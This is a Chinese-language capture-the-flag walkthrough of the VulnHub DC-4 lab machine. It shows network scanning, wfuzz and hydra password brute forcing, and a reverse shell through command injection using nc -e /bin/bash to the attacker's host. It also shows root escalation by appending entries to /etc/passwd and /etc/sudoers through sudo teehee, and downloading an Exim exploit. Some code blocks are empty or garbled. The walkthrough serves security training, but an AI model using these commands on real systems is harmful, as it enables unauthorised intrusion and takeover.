**主机信息**  

DC4：192.168.229.136

Kali：192.168.229.135

# **实验过程**

先发现内网存活主机

```

sudo arp-scan --interface eth0 192.168.229.1/24
```

![](../Images/b19486fceee7955717069681a2015237.png)

然后查看靶机开放的端口

```

sudo nmap -A -p- -T4 -v 192.168.229.136 
```

![](../Images/2fa28603588e1bcc918bc89157f30ba8.png)

访问80，是一个登录页面

![](../Images/e1e23bf968f95c94eebacadbb607c252.png)

既然遇到登录页面，那就可以尝试看看，是否有弱口令

```
# 使用的字典


```

这里我是用的是Wfuzz来进行爆破

```
# -c :我记得是彩色输出
# -t :设置线程数量
# -w :字典文件
# -hw : 隐藏返回word字数为17的信息,这个靶机如果凭证错误的话word是17
# -d  : 请求体设置
"username=FUZZ&password=FUZ2Z"
 http://192.168.229.136/login.php
```

![](../Images/4b7168d088b189a6781dd849444156ed.png)

得到账号和密码

```

admin - happy
```

登陆后发现，是有类似命令执行的功能的

![](../Images/8cbc25e59cff2f4d50e2e2983ae3c8bc.png)![](../Images/6b8847a6b0cc805a11d373a2d87b34a6.png)

这个时候burp抓包看看

![](../Images/6f2c836f768e76c5c51b3b41563cf405.png)![](../Images/b744b7b6a765532f71040889c7ea7503.png)

这里我直接反弹shell用操作

```


nc -e+/bin/bash 192.168.229.135 4444
```

![](../Images/ee28b0b8f6374571cddadb1bc8b87d90.png)![](../Images/4acdb3ef2adb9eec65836699e63cd632.png)![](../Images/dfe2245365dc8eea8cc6ca35818967d0.png)

查看下passwd看看有什么用户适合提权

这里可以看到charles、jim、sam有/bin/bash，那么就从这3个用户开始入手

![](../Images/0fc0cdbf0991127f510dc15d2f879320.png)

去这几个用户的家目录看看有没有什么收获

可以看到jim目录下面有线索

![](../Images/866653b0d5c6a51ba1c986ded2b77b39.png)![](../Images/d4faaa13e96ff61a383c8c3ac84e449d.png)

在backups里面看到有一个old-passwords.txt的备份

![](../Images/992abf01b49666a7f88abe1ccb6aecd5.png)

将这些密码复制下来并对jim进行ssh爆破，因为在信息手机阶段我们可以看到靶机是打开了22端口

这里可以用nc进行文件传输

```
# Kali

# DC4


```

![](../Images/eea4d755a649674b4c194ab283951090.png)![](../Images/543ce7cf2a32711690b74c9fc567c13e.png)

现在用hydra对jim账号进行SSH爆破

```

hydra  -l jim -P /home/kali/vulnhub/dc4/old-passwords.txt ssh://192.168.229.136
```

![](../Images/f75030e7767ca9b09a5e8d240ad053ab.png)

```

[22][ssh] host: 192.168.229.136   login: jim   password: jibril04
```

登陆jim的ssh，查看有没有sudo权限

![](../Images/5ceb0b09869cd7b0d4601d0643cc6971.png)

说明要从其他方面入手，这里我们登录SSH提示有邮件，查看下

![](../Images/f5cfae4022841e44e88bebc381b54ab2.png)![](../Images/77e973e055eb65dbe8347740452d8907.png)

```


From charles@dc-4 Sat Apr 06 21:15:46 2019local

 (Exim 4.89)for

 jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000"UTF-8"

'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
```

这里给出了Charles的密码，那么我们切换到Charles

```


Charles
```

![](../Images/17e3c233fe04155ead34358faf5991ff.png)

看下charles的sudo

![](../Images/86d0ea7c0eded2c4b5e87798d3eacd14.png)

可以看到使用teehee提权,teehee就是tee的变体从标准输入读取并写入标准输出和文件

我们可以借助teehee往passwd写入一个root账号即可得到root 权限

![](../Images/0c0e0f7926dab7158404e661234c9ef6.png)

```
echo "cooper::0:0:::/bin/bash"
 | sudo teehee -a /etc/passwd
```

![](../Images/680b44b83c8ed5956f77fca39c1d65c1.png)

尴尬的是因为是没有密码，一直无法登录，看了下别人都是可以登录我也找不出原因

![](../Images/27911db6ee53a46e34de4bba6fe0ef1a.png)

于是换了思路，直接给charles赋予完全的root权限

```
echo 'charles ALL=(ALL:ALL) NOPASSWD:ALL'
 | sudo teehee -a /etc/sudoers
```

![](../Images/5015660d662dbf22012c2ba67a54e390.png)

然后直接sudo登录root账号

```

sudo su - root
```

![](../Images/aefd93b623ad32b01be3d174aff86f37.png)

这里还有一种提权方法

通过cat jim的邮件我们可以看到Exim的版本为4.89

![](../Images/73c0aeb875493757a0c09eaf180588f6.png)

有一个CVE-2019-10149可以使用

```

searchsploit Exim
```

![](../Images/92414d907ebba18bbd49bced496fd96a.png)

```
searchsploit -p linux/local
/46996.sh
```

![](../Images/3afce2b2a1de94e51b8066915eebf857.png)

将exp拷贝过来，开启Python的HTTP服务，让靶机进行下载执行

![](../Images/30e1bc9c3f1d98931c33f5360bcb7e4f.png)![](../Images/dde5c51dc3bc9b09a37ffdcfb7595bd6.png)![](../Images/2e4084673a7aeb3b33b6b76f17665d72.png)

然后执行脚本得到root权限

![](../Images/eb2664960230bbdc4b9df5953c5ac226.png)
